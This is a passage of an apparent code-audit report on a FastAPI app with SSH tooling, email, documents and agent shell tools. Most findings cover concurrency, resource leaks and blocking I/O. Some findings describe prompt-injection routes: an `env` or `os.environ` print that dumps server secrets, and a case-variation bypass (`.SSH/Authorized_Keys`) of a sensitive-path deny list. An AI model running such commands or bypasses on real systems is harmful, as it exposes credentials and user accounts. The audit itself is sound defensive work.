detail: Both model_download (lines 528-533) and model_serve (lines 1283-1288) run `create_subprocess_shell(setup_cmd, stdout=PIPE, stderr=PIPE)` then `await proc.wait()` with no asyncio.wait_for and no ssh ConnectTimeout in setup_cmd (unlike every other ssh call in this file). Two failure scenarios: (a) an unresponsive/blackholed remote host makes ssh block on TCP for minutes — the HTTP request hangs with no bound; (b) `proc.wait()` with PIPEd streams is the documented asyncio deadlock: if scp/ssh emit more stderr than the pipe buffer (~64KB, e.g. verbose host-key or network error spam), the child blocks writing, wait() never returns, and the handler hangs permanently while holding the subprocess.
fix: Use `stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)` (kill the proc on TimeoutError), and add `-o ConnectTimeout=10 -o BatchMode=yes` to the ssh/scp invocations in setup_cmd.

title: Subprocesses leaked (never killed or reaped) when asyncio.wait_for times out
detail: Several call sites do `await asyncio.wait_for(proc.communicate(), timeout=N)` and on TimeoutError neither kill nor await the process: line 217 (_remote_binary_available — swallowed by `except Exception: return False`), line 620 (model_cached local scan — TimeoutError propagates as a 500), lines 1347/1357 (server_setup platform detect), line 1443 (server_setup main command, returns an error dict), line 1827 (kill_pid ssh path). Contrast with the correct handling at lines 1497 and 1526 which call proc.kill(). Failure scenario: a hung ssh/python child keeps running after the request returns; repeated polls against a dead host accumulate orphaned ssh processes and zombies (never wait()ed), eventually exhausting PIDs/fds on the Atenea host.
fix: On TimeoutError call `proc.kill()` then `await proc.wait()` (or `await proc.communicate()`) before returning, at each of the listed call sites — matching the pattern already used at lines 1495-1498.

title: Path.write_text() called with unsupported mode='a' — Ollama warmup logging always raises TypeError, exception path crashes the task
detail: _warmup_ollama_model calls `log_path.write_text(..., mode="a", encoding="utf-8")` at lines 1263-1267, 1269-1273, and 1275-1279. pathlib.Path.write_text has no `mode` parameter in any Python version, so this raises TypeError. The success/failure branches raise inside the try, are caught by `except Exception as exc` (1274), which then calls write_text(mode="a") AGAIN inside the except block — that second TypeError escapes and kills the fire-and-forget task with only a default asyncio 'exception was never retrieved' log. Net effect: the warmup result ('Model loaded into memory' / 'Warmup failed') is NEVER written, so the Docker-Ollama serve log the status poller reads stays stuck at '--- Warming up model ---'. Additionally the `asyncio.ensure_future(...)` result (line 1280) is not kept in a strong reference, so the task can be garbage-collected before it completes.
fix: Replace with `with open(log_path, 'a', encoding='utf-8') as f: f.write(...)` (via asyncio.to_thread or aiofiles), and store the task reference (e.g. module-level set with done-callback discard) per the asyncio docs.

title: Unsynchronized read-modify-write of cookbook state file between the orphan sweep thread and the state POST handler (lost updates, duplicate adoptions)
detail: Two writers mutate the same JSON file with independent read-modify-write cycles and no lock: save_cookbook_state on the event loop (read at 1873, write at 1943) and _maybe_sweep_orphans inside asyncio.to_thread worker threads (read at 2302, write at 2210). atomic_write_json prevents torn files but not lost updates: a UI POST landing between the sweep's read and write erases freshly adopted tasks (or the sweep's write erases tasks/env the POST just saved, bypassing the anti-wipe guards). The sweep's rate limiter is itself a non-atomic check-then-set on shared list _last_orphan_sweep_ts (lines 2086-2089): two status polls dispatched to different threads within the window both pass the check, both SSH-sweep, and both append the same orphan sid — each thread's known_sids lacks the other's adoption — producing duplicate task entries in state. Failure scenario: with the UI polling /tasks/status every ~3s from two tabs, duplicated '_adoptedExternally' tasks appear and agent-registered tasks intermittently vanish.
fix: Guard all state-file read-modify-write cycles with a single threading.Lock (acquired in save_cookbook_state via to_thread as well), and make the rate limiter a compare-and-set under that same lock.

title: Shared fixed-name scan_cache.py raced by concurrent /api/model/cached requests
detail: model_cached writes the generated scan script to the constant path TMUX_LOG_DIR/'scan_cache.py' (line 581) and, in the local branch, executes that file by path (line 615). Two concurrent requests with different `model_dir` parameters race: request B overwrites the file after A wrote it but before A's python child reads it, so A executes B's script and returns B's directory scan (wrong hosts/dirs). The remote branch is safe (it snapshots read_bytes and pipes via stdin) — only the local exec-by-path is racy.
fix: Write to a unique temp file (tempfile.NamedTemporaryFile / f'scan_cache_{uuid4().hex}.py') and delete it after the scan, or run the local scan with `local_py -` feeding scan_payload via stdin like the remote path.

title: N+1 sequential SSH connections in AMD GPU probe makes /api/cookbook/gpus take tens of seconds on remote hosts
detail: _probe_amd_sysfs performs a separate full SSH connection (each with its own handshake, ConnectTimeout=5) for EVERY sysfs file of EVERY card: vendor, vram_total, vis_vram_total, gtt_total, used, product_name, device, gtt_used (lines 1574-1606) — 6-8 round trips per card — and _probe_gpu_device_processes adds one more ssh per PID for `ps -p` (line 1560). On a remote 8-GPU ROCm box with, say, 200ms RTT and key exchange, the /api/cookbook/gpus fallback path serially issues 50+ SSH sessions (each awaited one at a time), taking 30s+ and hammering the remote sshd. Since this is the fallback after nvidia-smi fails, every GPU-picker refresh on an AMD host pays this.
fix: Batch into one remote script per host (single _run_gpu_shell that loops over /sys/class/drm and prints all fields as JSON/TSV), or at minimum reuse an SSH ControlMaster connection and gather the per-file reads with asyncio.gather.

title: Blocking IMAP/SMTP/SQLite I/O runs directly on the event loop inside async _auto_summarize_pass_single
detail: The two LLM HTTP calls are correctly wrapped in asyncio.to_thread (lines 416, 868), but every other I/O in this async function is synchronous and runs on the event loop: _imap_connect (line 203), conn.select (214, 222, 241, 318), conn.uid SEARCH (223), conn.uid FETCH '(RFC822)' (320) which downloads the entire raw message, _imap_move (901), _send_smtp_message (823), and 6+ sqlite3.connect/execute blocks (246-275, 429-436, 472-479, 689-697, 747-758, 905-915). imaplib has no timeout by default here; a slow IMAP server or a multi-MB message FETCH stalls the whole FastAPI process (all requests, all other pollers) for seconds to minutes per message, once per account every 30 minutes. Concrete scenario: Gmail account with a 20 MB attachment email — the RFC822 FETCH at line 320 blocks the loop for the full download; every HTTP request to the app hangs during that time.
fix: Wrap each IMAP/SMTP/SQLite operation in await asyncio.to_thread(...) (or restructure the whole per-account pass as a sync function invoked once via to_thread, keeping only the LLM awaits async), and fetch headers/BODY.PEEK[TEXT]<0.N> instead of full RFC822 where possible.

title: Scheduled-email rows are not claimed before sending — duplicate email delivery race
detail: _scheduled_poll_once SELECTs all pending rows (997-1001), closes the connection, sends each via SMTP (1044), and only afterwards flips status='sent' in a separate connection (1056-1059). There is no claim step, so the window between SELECT and UPDATE spans a full SMTP transaction plus an IMAP APPEND (1048-1052). Concrete scenario: the in-process 30-second poller (line 1085) overlaps with a cron-driven `atenea-mail poll-scheduled` run (a deployment mode the docstrings at 986 and 1108 explicitly support), or one SMTP send takes >30s so the previous to_thread tick is still mid-row — both pollers read the same pending row and the recipient receives the email twice. A crash between line 1044 and 1057 also re-sends on restart. The env-var guard at 1104 only documents the race; nothing enforces it.
fix: Atomically claim rows before sending: `UPDATE scheduled_emails SET status='sending' WHERE id=? AND status='pending'` and proceed only if rowcount==1 (or SELECT ... then per-row claim), keeping the claim and send in the same pass; mark 'sent'/'failed' afterwards and sweep stale 'sending' rows older than N minutes back to 'pending'.

title: Non-atomic read-modify-write of shared settings in _run_auto_summarize_once can permanently corrupt user flags and trigger disabled destructive actions
detail: Lines 84-100 flip five persisted settings flags globally, run the pass, then restore. Two failure scenarios: (1) Two concurrent invocations (e.g. two scheduled email tasks overlap, or a user clicks Run twice): call B executes _load_settings() at line 84 while call A's flipped values are persisted, snapshots them as `prev`, and its finally-block permanently writes A's temporary flags — e.g. email_auto_spam=True the user never enabled, after which the 30-minute background poller (line 977) silently moves inbox mail to the Spam folder (line 901) every pass. (2) The background _auto_summarize_poller wakes during the window, reads the flipped flags via _load_settings() at line 183, and drafts auto-replies / moves mail to spam for operations the user has disabled. The flags are shared mutable persisted state with no lock and no request-scoped override.
fix: Pass the operation flags as parameters into _auto_summarize_pass/_auto_summarize_pass_single (overriding the settings-derived values at lines 184-188) instead of mutating persisted settings; if the settings round-trip must stay, guard it with an asyncio.Lock shared with the poller.

title: SQLite connections leak on exception — no try/finally or context managers around connect/close pairs
detail: The cache-preload connection opened at line 246 executes up to five queries (249-274) before close() at 275 with no try/finally; any OperationalError (locked DB, missing table after a partial migration) skips close and the connection leaks — and this runs every 30 minutes per account. The same pattern repeats at 429-436, 472-479, 689-697, 747-758, 905-915, 993-1002, 1056-1059, and 1064-1067: in each, an exception between connect() and close() leaks the handle (the surrounding except blocks catch the error but never close the connection). Leaked write connections can also hold the SQLite lock until GC, causing 'database is locked' failures in the routes that share SCHEDULED_DB.
fix: Use `with closing(sqlite3.connect(SCHEDULED_DB)) as _c:` (or contextlib.closing / `with conn:` for the transaction plus try/finally for close) around every connect/close pair; ideally open one connection per pass instead of one per cached record.

title: _owner_for_email_account swallows all exceptions and falls back to the unowned tenant scope
detail: Lines 60-61 return "" on any exception (e.g. transient 'database is locked' during the owner lookup). Downstream, "" selects the legacy/unowned scope: _email_cache_owner_clause('') matches owner='' OR owner IS NULL rows (verified in email_helpers.py:309-313), so the pass reads and writes summaries/replies/tags for an owned account into the shared unowned cache partition (lines 249-274, 434, 477, 911), and _imap_connect(account_id, owner='') at 203 loses the owner scoping the helper's own SECURITY comment says exists to prevent cross-user fallback. Same fallback path in _scheduled_poll_once at line 1010. A one-off DB hiccup thus silently degrades tenant isolation for the whole pass instead of failing it, and nothing is logged above debug level.
fix: Let the exception propagate (or return a sentinel and skip the account with a logged warning) instead of returning ""; only map a genuinely-missing account row to the legacy scope.

title: Failure-path DB write inside the per-row except handler can abort the remaining scheduled-email batch
detail: In _scheduled_poll_once, when a send fails, the except handler at 1062-1068 opens a new connection and writes status='failed'. If that write itself raises (SQLite locked by the concurrent in-process poller or a route), the exception escapes the per-row handler to the outer except at 1069, so all remaining due rows in this pass are skipped and the failed row stays 'pending' with no error recorded — it will be retried and can loop on the same failure while starving later rows in the same tick.
fix: Wrap the status='failed' update in its own try/except (log and continue), so one row's bookkeeping failure cannot abort the rest of the batch.

title: Sync SQLAlchemy sessions used inside every async handler block the event loop
detail: All ~18 route handlers are declared 'async def' but use the synchronous SessionLocal() ORM (e.g. create_document line 88, documents_library lines 274-356, update_document line 564). Every query/commit runs directly on the event loop thread. Failure scenario: on SQLite, a commit that hits a write lock (another worker/thread holding the DB) stalls for the full busy-timeout; during that time the single uvicorn event loop can serve no other request — health checks, chat streaming, and all other endpoints in the app freeze. Even the happy path serializes all HTTP traffic behind each library query (documents_library runs 4 separate queries incl. a LIKE scan over current_content).
fix: Declare these handlers as plain 'def' so FastAPI runs them in its threadpool, or wrap the DB work in 'await asyncio.to_thread(...)' / migrate to SQLAlchemy async sessions. No handler here needs 'async def' except the ones that await llm_call_async / request.json().

title: Heavy CPU/OCR/network operations executed synchronously inside async handlers
detail: Long-running blocking work runs directly in async handlers: (1) import_pdf line 215 and extract_pdf_text line 469 call _process_pdf (pypdf + vision-model OCR — can take minutes on a scanned PDF); (2) render_page_png line 1140 and ai_fill_annotations lines 1211-1216 do PyMuPDF get_pixmap rasterization + base64 of every page (CPU-bound, seconds per page); (3) render_pdf/export_pdf/prepare_signed_reply call fill_fields/stamp_signatures/stamp_annotations (lines 1338, 1461, 1600) synchronously; (4) prepare_signed_reply lines 1675-1677 performs a blocking IMAP socket fetch (conn.select + conn.fetch) with no event-loop yield. Failure scenario: one user importing a 50-page scanned PDF freezes the entire server for every other user until OCR completes; a hung IMAP server (default socket timeout) blocks the loop indefinitely.
fix: Run these operations via 'await asyncio.to_thread(...)' (or make the handlers sync 'def' to use the threadpool), and set an explicit timeout on the IMAP connection.

title: Temp PDF files leak on error paths in export_pdf / render_pdf / prepare_signed_reply
detail: prepare_signed_reply creates filled_path via NamedTemporaryFile(delete=False) (line 1598) and then calls fill_fields (line 1600) with NO try/except and no BackgroundTask cleanup — if fill_fields, parse_markdown_annotations (1611), the Signature query (1625), stamp file creation, or shutil.copyfile (1647) raises, the request 500s and every file in _to_unlink is orphaned in /tmp forever. The same gap exists in render_pdf and export_pdf: _cleanup_temps is invoked only inside the fill_fields except-blocks (lines 1341, 1464) and via the FileResponse BackgroundTask; an exception anywhere between temp creation and the return (e.g. parse_markdown_annotations at 1344/1478, the Signature query at 1358/1444, base64 handling) leaks all temps created so far. Failure scenario: a corrupt PDF or transient DB error on a busy server steadily fills the temp filesystem with orphaned .pdf files until the disk is exhausted.
fix: Wrap each handler body in try/except that calls _cleanup_temps() before re-raising (and only skip cleanup on the success path where the BackgroundTask takes ownership). In prepare_signed_reply, add a try/finally that unlinks _to_unlink regardless of outcome since the response never streams the temps.

title: can_use_documents privilege enforced only on 2 of ~18 document routes
detail: create_document (line 87) and import_pdf (line 184) call require_privilege(request, "can_use_documents"), but every other route — update_document (562), patch_document (624), delete_document (663), export-zip (499), export-pdf (1386), ai-tidy (881, which hard-deletes documents and spends LLM tokens), ai-fill-annotations (1152, which spends vision-model tokens per page), prepare_signed_reply (1522, which reads the user's IMAP mailbox) — only calls get_current_user. Failure scenario: an authenticated user whose admin explicitly revoked the documents privilege can still read, modify, delete, export, and OCR their documents, and can invoke the paid LLM endpoints (ai-tidy, ai-fill) that the privilege is presumably meant to gate. _verify_doc_owner prevents cross-user access but not privilege bypass.
fix: Call require_privilege(request, "can_use_documents") at the top of every document route (or apply it as a router-level dependency) instead of get_current_user.

title: Non-atomic version_count read-modify-write produces duplicate version numbers under concurrency
detail: update_document (line 598 'new_ver = doc.version_count + 1'), restore_version (line 753), and extract_pdf_text (line 483) each read version_count, increment in Python, and commit without any locking or unique constraint handling. Failure scenario: with multiple uvicorn workers (or the threadpool fix from the performance finding), two concurrent PUTs on the same doc both read version_count=5 and both insert DocumentVersion(version_number=6); version history then shows two v6 rows and get_version /restore/{num} (.first() at line 728) silently returns an arbitrary one, so a restore can resurrect the wrong content.
fix: Add a UNIQUE(document_id, version_number) constraint and retry on IntegrityError, or compute the number in SQL (version_count = Document.version_count + 1 as a server-side expression / SELECT ... FOR UPDATE where supported, or BEGIN IMMEDIATE on SQLite).

title: ai_tidy deletes documents from ORM state that is stale after a 30s await
detail: ai_tidy_documents loads docs and 300-char previews (line 905-917), then awaits llm_call_async for up to 30s (line 927), then calls db.delete(doc) (line 954) on the pre-await ORM objects. Failure scenario: the user edits a 'junk-looking' stub into real content during the await — the verdict was computed on the stale preview and the freshly written content is hard-deleted (permanent data loss, since this bypasses the is_active soft-delete used elsewhere). If instead the doc was concurrently deleted, flush raises StaleDataError, the whole batch rolls back, and all verdicts (including 'keep' stamps meant to cache reviews) are lost.
fix: Re-fetch each doc by id after the await and compare updated_at/current_content against the reviewed snapshot before deleting; soft-delete (is_active=False) instead of db.delete; commit verdicts per-doc or catch StaleDataError per-row so one conflict doesn't discard the batch.

title: export-zip accepts unbounded id list and builds the whole archive in memory
detail: documents_export_zip places no limit on data['ids'] (line 508) and loads every matching Document row — including full current_content — via .all() (line 524), then writes the entire zip into an in-memory BytesIO (line 525-543) inside an async handler. Failure scenario: a user selecting their whole library (or a scripted client posting thousands of ids of multi-MB docs) makes one request allocate hundreds of MB and block the event loop while compressing, driving the process into OOM/latency spikes.
fix: Cap len(ids) (e.g. 200) with a 400 on overflow, iterate documents with yield_per()/chunked queries instead of .all(), and stream the zip (e.g. write to a spooled temp file and return FileResponse, offloading compression to a thread).

title: ai_fill_annotations 500s on malformed request body instead of 400
detail: Line 1167 'body = await request.json() if ...' has no exception handling — a request with Content-Type: application/json but invalid JSON raises json.JSONDecodeError and surfaces as a 500. Likewise a non-string 'instruction' (e.g. {"instruction": 5}) hits .strip() at line 1168 and raises AttributeError → 500. Also note line 1162 imports fitz directly instead of using the guarded _load_pdf_viewer_fitz() (line 75), so a missing PyMuPDF yields an unexplained 500 here while sibling routes return a clean 503.
fix: Wrap request.json() in try/except returning HTTPException(400, 'Invalid JSON body'), coerce/validate instruction with str() or a Pydantic model, and use _load_pdf_viewer_fitz() instead of the bare import.

title: PDF text-extraction failure in import_pdf is swallowed with no logging
detail: Lines 214-217: 'except Exception: body_text = None' around _process_pdf discards the exception entirely — no logger call, unlike the has_form_fields failure right below (line 223) which is logged. Failure scenario: OCR/VL extraction breaks (bad endpoint config, pypdf bug) and every imported PDF silently becomes a text-less document; the operator has zero log signal that extraction is failing and users only notice much later that the AI 'can't see' any of their PDFs.
fix: Log the failure: 'except Exception as e: logger.warning(f"PDF text extraction failed for {pdf_path}: {e}"); body_text = None' (matching the pattern used at line 222-223).

title: Unbounded stdout/stderr accumulation for up to 1 hour per subprocess
detail: _run_subprocess_streaming appends every output line of the child to stdout_full/stderr_full Python lists (lines 393-394, appended at 405) with no size cap. Truncation to MAX_OUTPUT_CHARS only happens AFTER the process exits (lines 743, 770). With DEFAULT_BASH_TIMEOUT = 3600s, a model-issued command like `yes`, `cat /dev/urandom | base64`, or a chatty build can emit tens of GB of lines that are all held in RAM, OOM-killing the FastAPI server. Concurrent sessions multiply this.
fix: Enforce the byte budget while reading: in _reader, stop appending to full_buf once cumulative length exceeds MAX_OUTPUT_CHARS (keep only the tail deque for progress), and either discard further lines or keep a bounded head+tail. E.g. track total_len and skip full_buf.append when total_len > MAX_OUTPUT_CHARS * 2.

title: proc.kill() on timeout/cancel does not kill the process group — shell children survive orphaned
detail: bash runs via create_subprocess_shell (line 725) without start_new_session=True. On timeout (line 439) or user cancel (line 451) only the top shell (`/bin/sh -c ...`) is killed; any children it spawned (pipelines, `python long_script.py`, servers, downloads) are reparented to init and keep running forever, consuming CPU/RAM/disk. They also hold the stdout/stderr pipe open, so the reader tasks never see EOF and are force-cancelled by the 1s wait_for at line 474, silently losing buffered output. Every timed-out or user-cancelled multi-process command leaks running processes on the host.
fix: Pass start_new_session=True to create_subprocess_shell/exec, and on timeout/cancel kill the whole group: os.killpg(os.getpgid(proc.pid), signal.SIGKILL) (guarded by try/ProcessLookupError), falling back to proc.kill() on non-POSIX.

title: All server environment secrets inherited into model-controlled bash/python subprocesses
detail: _subproc_env = {**os.environ, ...} (lines 715-721) passes the entire server environment — API keys (ANTHROPIC/OPENAI), DB credentials, webhook tokens, proxy creds — into subprocesses whose command text is fully model-controlled. A prompt-injected instruction as trivial as running `env` (or python `-c 'import os; print(os.environ)'`) exfiltrates every secret into the chat transcript/model context. This defeats the elaborate path-confinement built for read_file/write_file in the same file: the .env deny-list entry at line 158 blocks reading the .env file while bash hands the same secrets over directly.
fix: Build a minimal allowlisted env (PATH, TERM, COLUMNS, LINES, HOME, LANG, TMPDIR) instead of spreading os.environ; or at minimum strip keys matching (?i)(key|token|secret|password|credential|auth) before spawning.

title: format_tool_result raises KeyError when a result has 'stdout' but no 'stderr'
detail: The branch is guarded only by `if "stdout" in result:` (line 1566) but then unconditionally indexes result["stderr"] (line 1569). MCP servers routed through mcp.call_tool (lines 587, 1537) commonly return {"stdout": ..., "exit_code": 0} without a stderr key (the generate_image promotion at line 614 shows stdout-shaped MCP results are expected). Formatting such a result raises KeyError inside the agent loop, turning a successful tool call into a stream error.
fix: Use result.get("stderr"): `if result.get("stderr"): parts.append(...)`.

title: web_search/web_fetch leak hung threads into the shared default executor, starving asyncio.to_thread
detail: comprehensive_web_search (lines 1086-1097) and fetch_webpage_content (lines 1133-1136) run in loop.run_in_executor(None, ...) wrapped in asyncio.wait_for(..., 30). When the 30s deadline fires, the thread cannot be cancelled and keeps running until its own internal socket timeouts (or indefinitely for a stalled TLS handshake/slow-loris server). Those zombie threads occupy the *default* ThreadPoolExecutor — the same pool asyncio.to_thread uses for read_file/write_file/edit_file/grep/glob/ls in this file. A burst of slow/hanging fetches (max ~min(32, cpu+4) workers) makes every file tool across all sessions queue indefinitely, stalling the whole agent.
fix: Run web fetch/search in a dedicated bounded ThreadPoolExecutor (e.g. module-level ThreadPoolExecutor(max_workers=8) passed as the first arg to run_in_executor), and ensure the underlying HTTP calls have hard connect/read timeouts below 30s so abandoned threads self-terminate.

title: Sensitive-path deny list bypassed by case variation on case-insensitive filesystems
detail: _is_sensitive_path compares path components case-sensitively (`part in _SENSITIVE_BASENAMES`, line 176) and filenames by exact set equality (line 181). On macOS/Windows (case-insensitive filesystems, explicitly supported — see the normcase comment at lines 294-297), a model-supplied path like `<workspace>/.SSH/Authorized_Keys` or `~/.Env` resolves to the real `.ssh/authorized_keys`/`.env` but passes the deny list, since realpath does not canonicalize case. When the workspace is (or extra roots include) a user home directory, prompt injection can write authorized_keys or read .env despite the policy whose entire purpose (comment at lines 138-151) is blocking exactly that.
fix: Normalize before matching: compare os.path.normcase(part).lower() against the (lowercase) deny sets, and match _SENSITIVE_FILE_PATTERNS as case-insensitive substrings of the lowercased basename.

title: Synchronous settings/DB lookup on the event loop for every path resolution
detail: _tool_path_roots() calls src.settings.get_setting("tool_path_extra_roots") (lines 214-215) — a synchronous SQLite read — and it runs directly on the event loop: _resolve_tool_path is invoked from async code before the to_thread hop (line 89 in _do_edit_file, 787/831 in _direct_fallback, and via _resolve_search_root at 885/969/1016). Under SQLite write contention (busy_timeout waits) each read_file/write_file/grep call can block the entire event loop for the lock-wait duration, freezing all concurrent SSE streams.
fix: Move path resolution inside the existing asyncio.to_thread workers (resolve inside _read/_write/_grep), or cache the extra-roots setting with a short TTL so the DB is not hit on the hot path.

title: SSH host key verification disabled (StrictHostKeyChecking=no)
detail: _ssh_base_argv hardcodes '-o StrictHostKeyChecking=no' for every remote probe and rebuild command. Scenario: an on-path attacker (or a DNS-poisoned/rotated IP for the GPU server) presents their own SSH host key; the client silently accepts it, and the attacker receives the executed command stream and can return forged probe JSON that list_packages parses (line 1151), or intercept the rebuild command run by rebuild_engine (line 1392). This turns every remote package check into a MITM-able channel.
fix: Use '-o StrictHostKeyChecking=accept-new' (TOFU) at minimum, or better 'yes' with a managed known_hosts file (-o UserKnownHostsFile=<app-managed path>) so subsequent key changes are rejected.

title: Blocking network and import I/O inside async list_packages handler
detail: list_packages is `async def` but performs synchronous blocking work on the event loop: urllib.request.urlopen against up to 3 Ollama URLs with timeout=1.5 each, in up to two separate blocks per request (lines 1208, 1243, 1261) — up to ~4.5-9s of event-loop stall when Ollama is down (and 'host.docker.internal' DNS resolution is not bounded by the urlopen timeout, so it can stall longer); importlib.import_module(pkg['name']) at line 1297 imports heavy packages like diffusers/torch/playwright, which can take multiple seconds of CPU+disk on first import; plus repeated shutil.which and _running_in_container() file reads. Scenario: while one user opens the Dependencies panel with Ollama stopped, every other request to the app (including SSE shell streams) freezes for several seconds.
fix: Wrap the probe work in await asyncio.to_thread(...) (or run the whole local-probe section in a thread), and replace the urllib loop with a single helper executed off-loop; cache the Ollama reachability result for a few seconds.

title: Timed-out subprocesses are never killed (SSH probes and rebuild-engine)
detail: Three places await asyncio.wait_for(proc.communicate(), ...) without killing the child on timeout: the remote package probe (line 1145), the remote system-binary check (line 1177), and rebuild_engine (line 1402, which returns 'timed out' at 1404 leaving proc alive). asyncio.wait_for cancels the communicate() coroutine but the ssh/bash child keeps running with its PIPE fds open. Scenario: an unreachable-but-not-refusing host (packet blackhole) makes every /api/cookbook/packages refresh spawn an ssh process that lives for ConnectTimeout or hangs at the remote command stage; repeated panel refreshes accumulate orphaned ssh processes and pipe fds. In the probe handlers the TimeoutError is additionally swallowed by the bare `except Exception` (lines 1160, 1185-1186), so nothing is even logged.
fix: except (TimeoutError, asyncio.TimeoutError): proc.kill(); await proc.wait() in all three sites (mirror the pattern already used in _exec_shell lines 438-444), and log the swallowed probe failures at warning level.

title: tmux/detached log tail re-reads the entire log file every second on the event loop
detail: _generate_tmux (lines 654-667, 684-695) and _generate_win_detached (lines 767-787) call log_path.read_text().splitlines() once per second, synchronously, inside async generators. This is O(file size) blocking I/O per poll and O(n^2) total over the command's lifetime, with the whole file materialized in memory each tick. Scenario: a Cookbook model download in tmux emits a multi-MB progress log over 30 minutes; every second the event loop blocks to read and split the entire multi-MB file, stalling all other requests, and memory churns with full-file copies. Note MAX_OUTPUT truncation is not applied on this path at all.
fix: Keep a byte offset instead of a line count: open the file, seek(offset), read only the new bytes (via await asyncio.to_thread), and carry a partial-line buffer; this makes each poll O(new data).

title: timeout=0 ('no timeout') on /api/shell/exec kills the command immediately
detail: ShellExecRequest documents timeout: '0 = no timeout' (line 396) and the streaming path honors that (line 913: `if timeout` treats 0 as no deadline), but shell_exec passes req.timeout straight through (line 820) and _exec_shell calls asyncio.wait_for(proc.communicate(), timeout=0) at line 434. wait_for with timeout=0 raises TimeoutError immediately unless the process already finished. Scenario: a client sends {"command": "long_build.sh", "timeout": 0} expecting an unbounded run; the process is spawned then instantly killed and the response is 'Command timed out after 0s'.
fix: In _exec_shell (or shell_exec), map timeout 0/None to no wait_for: `stdout_b, stderr_b = await proc.communicate()` when not timeout, else wait_for(..., timeout=timeout).

title: tmux/detached log and script files leak on client disconnect or launch failure
detail: Cleanup of log_path only happens after the exit-code loop completes (line 706). If the client disconnects, _generate_tmux returns at line 650 and _generate_win_detached at line 765 without deleting log/exit/script files — and disconnect-then-keep-running is the advertised main use case of this feature, so the leak path is the common path. Additionally, if tmux fails to start (line 633) the wrapper script at TMUX_LOG_DIR/<id>.sh is never removed because the `rm -f` lives inside the script that never ran. Scenario: weeks of long downloads started via tmux, each browser tab closed mid-run, leave one multi-MB .log per run in the temp dir until reboot, unbounded growth on servers with persistent /tmp.
fix: Add a startup/periodic sweep of TMUX_LOG_DIR deleting files older than N days, and delete script_path in the tmux-failed-to-start branch; optionally record session_id->log mapping so a later reconnect endpoint can clean up after the session ends.

title: Blocking _pty_read called directly on the event loop in the PTY drain phase
detail: The main PTY read loop correctly dispatches _pty_read via run_in_executor (line 509), but the post-exit drain loop at lines 536-543 calls _pty_read(master_fd) directly in the coroutine. _pty_read does select.select([fd], [], [], 1.0), so the final iteration (when no more data is pending) blocks the entire event loop for up to 1 second. Scenario: every PTY-mode shell stream stalls all other requests (other SSE streams, API calls) for ~1s at command completion.
fix: Use `rest = await loop.run_in_executor(None, _pty_read, master_fd)` in the drain loop, or reduce the select timeout for drain to 0 (non-blocking poll) since the process has already exited.

title: PTY master fd closed while an executor read may still be using it
detail: If the generator is torn down (client disconnect raises GeneratorExit while awaiting wait_for at line 508), the executor thread running _pty_read is not cancellable and may still be inside select()/os.read() on master_fd when the finally block closes it (line 575). select on a closed fd raises OSError outside _pty_read's try (its except only wraps os.read, line 587-591), producing an unretrieved-exception executor future; worse, if the fd number is reused by a concurrent request (another PTY stream or socket) within that ~1s window, the stale thread selects/reads on an unrelated fd, stealing bytes from another connection.
fix: Before closing master_fd in finally, wait for the in-flight executor future (keep a reference to it and await it with a short timeout / shield), or signal the reader via a pipe and only close the fd once the reader future has completed; also wrap the select call in _pty_read's try block.

title: Log tail emits and then drops the remainder of partially-written lines
detail: Both tail loops track progress as a line count over read_text().splitlines() (lines 658-667 and 771-773). If the last line in the file is still being written (no trailing newline yet — typical for progress output or buffered writes), it is emitted truncated and counted in lines_sent; when the process finishes the line, the completed portion is at the same index and is never re-read, so the rest of that line is silently lost. Scenario: 'Downloaded 5' is streamed, the process completes it to 'Downloaded 512 MB', the client permanently sees 'Downloaded 5'; if the marker line ':::EXIT_CODE:::0' itself is caught half-written (':::EXIT'), it streams as garbage output and the real exit-code line is skipped.
fix: Track a byte offset and only emit up to the last line terminator, keeping the trailing partial line in a buffer until it is completed or the process has exited (same fix as the O(n^2) tail finding).

title: Windows detached path reports exit_code 0 when the exit file cannot be parsed
detail: In _generate_win_detached, the block reading exit_path (lines 780-793) is wrapped in `except Exception: exit_code = 0`. Any read/parse failure — sharing-violation while the child still holds the file open, or garbage content — is swallowed and reported to the client as success. Scenario: cmd.exe wrapper is still flushing the exit file when exit_path.exists() first returns True; read_text raises PermissionError mid-write; a failed download is shown to the user as exit_code 0 (success).
fix: Catch only ValueError for the int parse and default to -1 (not 0); on transient read OSError, continue the loop and retry next tick instead of terminating with a fabricated success code.

title: Five module-level helpers are defined twice with divergent signatures; the first definitions are silently dead and callers get the wrong contract
detail: Five functions are defined twice at module scope, so Python keeps only the second (last) definition and the first is dead code that never runs, while their signatures/semantics differ: (1) `_pip_command` at line 181 (`if "pip" in python`) vs line 235 (token-based `" -m pip" in cmd`); (2) `_pip_install_help_check_from_cmd` at line 188 (takes a `pip_cmd`, appends `install --help`) vs line 343 (takes a full `cmd`, parses out the pip prefix, returns `str | None`); (3) `_pip_break_system_packages_check` at line 194 (takes a *python* executable and internally resolves it via `_pip_command`) vs line 245 (takes an *already-resolved pip_cmd* and does NOT resolve); (4) `_pip_install_command_without_break_system_packages` at line 199 (signature `(pip_cmd, packages)`) vs line 334 (signature `(cmd)`); (5) `_append_pip_install_runner_lines` at line 204 (signature `(lines, pip_cmd, packages)`, emits an if/elif/else break-system-packages chain) vs line 358 (signature `(runner_lines, cmd)`, different logic). Concrete failure scenario: any caller written against the first (documented) contract breaks. E.g. calling `_pip_break_system_packages_check("python3")` — passing a python executable exactly as the line-194 docstring says — actually hits the line-245 body and emits `python3 install --help 2>/dev/null | grep -q -- --break-system-packages` (missing `-m pip`), so the capability probe always fails and the `--break-system-packages` fallback is silently never taken. Likewise `_append_pip_install_runner_lines(lines, pip_cmd, packages)` or `_pip_install_command_without_break_system_packages(pip_cmd, packages)` called with the first signature raises `TypeError: takes 2 positional arguments but 3 were given` at runtime.
fix: Delete the dead first definitions (lines 181-213 for the four helpers plus 204-213) or, if the first versions are the intended API, delete the second ones — pick one implementation per name. Confirm against the importers in cookbook_routes.py which signature callers actually use, keep that one, and remove the shadow. Add a lint rule (e.g. pyflakes F811 'redefinition of unused function') to CI so future duplicate defs are caught.
